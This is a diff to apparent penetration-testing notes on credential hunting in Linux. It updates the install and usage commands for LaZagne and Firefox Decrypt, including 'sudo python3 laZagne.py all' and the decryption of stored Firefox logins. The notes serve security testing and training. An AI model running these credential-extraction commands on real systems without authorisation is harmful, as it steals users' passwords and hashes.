@@ -3092,8 +3092,18 @@ sudo ./mimipenguin.sh
 
 An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. 
 
+Install
+
 ```bash
-sudo python2.7 laZagne.py all
+git clone https://github.com/AlessandroZ/LaZagne
+cd LaZagne/
+python -m pip install --upgrade pip
+python -m pip install -r requirements.txt
+cd Linux/
+```
+
+```bash
+sudo python3 laZagne.py all
 ```
 
 The passwords and hashes we can obtain come from the following sources but are not limited to:
@@ -3156,13 +3166,24 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. The script is [`here`](../scripts/passwords/firefox_decrypt.py).
 
-**Usage: Python2**
+**Usage: Python3.9+**
+
+Install python 3.9.18
 
 ```bash
-python ./firefox_decrypt.py
+wget https://www.python.org/ftp/python/3.9.18/Python-3.9.18.tar.xz
+tar -xf Python-3.9.18.tar.xz
+cd Python-3.9.18
+./configure --enable-optimizations
+make -j$(nproc)
+sudo make altinstall
+cd ..
+rm -rf Python-3.9.18
+rm Python-3.9.18.tar.xz
+
 ```
 
-**Usage: Python3.9 (latest version)**
+Run firefox_decrypt
 
 ```bash
 python3.9 ./firefox_decrypt.py
@@ -3171,7 +3192,7 @@ python3.9 ./firefox_decrypt.py
 **Advanced usage**
 
 ```bash
-python firefox_decrypt.py /folder/containing/profiles.ini/
+python3.9 firefox_decrypt.py /folder/containing/profiles.ini/
 ```
 
 </details>
